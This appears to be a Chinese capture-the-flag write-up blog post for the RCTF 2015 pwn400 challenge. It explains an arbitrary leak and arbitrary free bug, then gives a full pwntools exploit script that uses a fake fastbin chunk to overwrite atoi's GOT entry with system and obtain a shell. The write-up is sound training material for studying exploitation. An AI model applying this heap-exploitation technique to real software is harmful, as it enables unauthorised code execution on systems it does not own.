---
layout: post
title: "rctf-pwn400"
date: 2015-11-17 18:13:29 +0800
comments: true
categories: 
---
###漏洞
可以泄漏任意地址，可以free任意地址

###利用
free第二个chunk进入fastbin，free伪造的chunk，再malloc即可写入ptr，改写ptr为atoi@got，利用*ptr=number可以改写其为system的地址
###payload

    from pwn import *
    libc = ELF('/usr/lib/libc.so.6')
    log.success(hex(libc.symbols['system']))
    
    p = process('./shaxian')
    p.sendline('aaaa' + p32(0x31))
    p.sendline('A'*244 + p32(0x30))
    
    #malloc
    p.sendline('1') 
    p.sendline('a'*32 + p32(0x804b01c) ) 	#for leak
    p.sendline('123') 
    
    #review
    p.sendline('4')
    
    
    #leak
    p.recvuntil('123')
    recvdata = p.recvuntil('*')
    system = u32(recvdata[1:5]) - libc.symbols['alarm'] + libc.symbols['system']
    log.info('system:' + hex(system))
    
    #malloc
    p.recvuntil('choose:\n')
    p.sendline('1')
    p.sendline('a'*32 + p32(0x804b1b8))	#for free
    p.sendline('123') 
    
    #free
    p.recvuntil('choose:\n')
    p.sendline('2')
    
    #malloc
    p.recvuntil('choose:\n')
    p.sendline('1')
    p.sendline('AAAA' + p32(0x804b038) )	#change ptr
    p.sendline(str(system - 2**32))		#write system
    
    p.interactive()

###note
int 输入整数最大为0x7fffffff  
可以将输入变为(x-2**32),达到写入任意数字的目的  
伪造堆chunk再利用
